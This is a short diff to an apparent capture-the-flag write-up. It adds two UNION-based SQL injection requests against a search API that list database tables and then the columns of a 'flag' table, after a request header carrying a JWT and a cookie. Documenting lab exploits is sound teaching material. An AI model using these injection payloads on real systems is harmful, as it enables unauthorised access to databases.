@@ -57,3 +57,8 @@ Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTYzODIwNjQs
 Connection: close
 Cookie: __cfduid=db55fdf3f4b3c7b3f017d3dc71893b0ab1596329705
 ``````
+The rest is just simple SQLi database enumeration from there as seen from the workshop!
+``````
+GET /api/modules/search/e 'UNION SELECT NULL,table_name from information_schema.tables-- a 
+GET /api/modules/search/e 'UNION SELECT NULL,column_name from information_schema.columns WHERE table_name='flag'-- a 
+``````
